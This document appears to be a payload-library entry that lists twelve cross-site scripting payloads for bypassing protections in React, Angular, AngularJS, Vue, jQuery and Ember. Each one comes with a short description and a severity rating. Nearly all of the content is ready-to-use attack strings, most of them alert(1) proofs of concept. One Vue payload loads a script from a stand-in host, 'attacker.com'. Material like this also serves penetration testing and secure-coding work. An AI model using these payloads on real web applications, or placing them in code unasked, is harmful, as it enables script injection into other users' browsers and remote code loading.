---
id: "xss-framework_bypass-payloads"
title: "XSS Payloads - Framework-Specific Bypasses"
type: "payload"
category: "web-application"
subcategory: "xss"
tags: ["xss", "framework_bypass", "payload"]
difficulty: "intermediate"
platforms: ["linux", "macos", "windows"]
related: ["xss-techniques"]
updated: "2026-03-30"
---

## Overview

Payloads designed to bypass popular JavaScript framework protections

## Payloads

### React dangerouslySetInnerHTML

Bypass React's XSS protection via dangerouslySetInnerHTML

- **Contexts**: script
- **Severity**: high

```html
React.createElement('div',{dangerouslySetInnerHTML:{__html:'<img src=x onerror=alert(1)>'}})
```

### Angular $sce.trustAsHtml

Bypass Angular's Strict Contextual Escaping

- **Contexts**: script
- **Severity**: high

```html
$sce.trustAsHtml('<script>alert(1)</script>')
```

### Vue v-html Directive

Abuse Vue.js v-html directive for XSS

- **Contexts**: html
- **Severity**: high

```html
<div v-html="'<img src=x onerror=alert(1)>'"></div>
```

### jQuery .html() Method

Bypass jQuery's basic escaping with .html()

- **Contexts**: script
- **Severity**: high

```html
$('<div>').html('<img src=x onerror=alert(1)>').appendTo('body')
```

### Ember.js SafeString

Abuse Ember.js SafeString for XSS execution

- **Contexts**: script
- **Severity**: medium

```html
Ember.String.htmlSafe('<script>alert(1)</script>')
```

### Vue 3 — Teleport XSS

Vue teleport moves decoded HTML to script element — becomes executable

- **Contexts**: html
- **Severity**: high

```html
<teleport to=script:nth-child(2)>alert&lpar;1&rpar;</teleport>
```

### Vue 3 — Emit Constructor Chain

Access Function constructor via $emit in Vue 3 template expressions

- **Contexts**: html
- **Severity**: high

```html
{{$emit.constructor`alert(1)`()}}
```

### Vue — Dynamic Component Script

Shortest Vue XSS (23 chars) — is= resolves to script element

- **Contexts**: html
- **Severity**: high

```html
<x is=script src=//attacker.com>
```

### Vue — mXSS Attribute Parsing

Vue decodes attributes and removes invalid names — entities become live HTML

- **Contexts**: attribute
- **Severity**: high

```html
<x title"="&lt;iframe&Tab;onload&Tab;=alert(1)&gt;">
```

### Vue — Event Composed Path

Traverse to window via composedPath in Vue event handler

- **Contexts**: html
- **Severity**: high

```html
<img src @error="e=$event.composedPath().pop().alert(1)">
```

### React — javascript: in href

React doesn't block javascript: URIs in href attributes

- **Contexts**: attribute
- **Severity**: high

```html
<a href="javascript:alert(document.domain)">Click</a>
```

### AngularJS — Constructor Chain (Post-Sandbox)

AngularJS 1.6+ removed sandbox — direct constructor access

- **Contexts**: html
- **Severity**: high

```html
{{constructor.constructor('alert(1)')()}}
```
